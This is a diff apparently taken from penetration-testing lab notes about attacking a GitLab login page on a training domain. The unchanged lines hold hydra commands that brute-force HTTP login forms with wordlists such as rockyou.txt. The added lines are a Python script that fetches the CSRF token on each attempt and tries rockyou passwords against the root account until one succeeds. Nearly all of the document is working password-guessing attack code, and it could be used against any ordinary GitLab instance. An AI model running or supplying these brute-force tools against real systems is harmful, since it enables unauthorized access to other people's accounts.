@@ -52,3 +52,36 @@ hydra -l admin -P passwords.txt <TARGET_IP> http-post-form \
 
 hydra -L username.txt -P /usr/share/wordlists/rockyou.txt gitlab.inlanefreight.local -s 8081 http-post-form \
 "/users/sign_in:user[login]=^USER^&user[password]=^PASS^:Invalid Login or password" -V
+
+
+import requests
+from bs4 import BeautifulSoup
+
+url = "http://gitlab.inlanefreight.local:8081/users/sign_in"
+username = "root"
+
+session = requests.Session()
+
+with open("/usr/share/wordlists/rockyou.txt") as f:
+    for password in f:
+        password = password.strip()
+
+        # Step 1: GET request (token fetch)
+        r = session.get(url)
+        soup = BeautifulSoup(r.text, "html.parser")
+        token = soup.find("input", {"name": "authenticity_token"}).get("value")
+
+        # Step 2: POST login
+        data = {
+            "utf8": "✓",
+            "authenticity_token": token,
+            "user[login]": username,
+            "user[password]": password,
+            "user[remember_me]": "0"
+        }
+
+        res = session.post(url, data=data)
+
+        if "Invalid Login" not in res.text:
+            print("[+] Password found:", password)
+            break
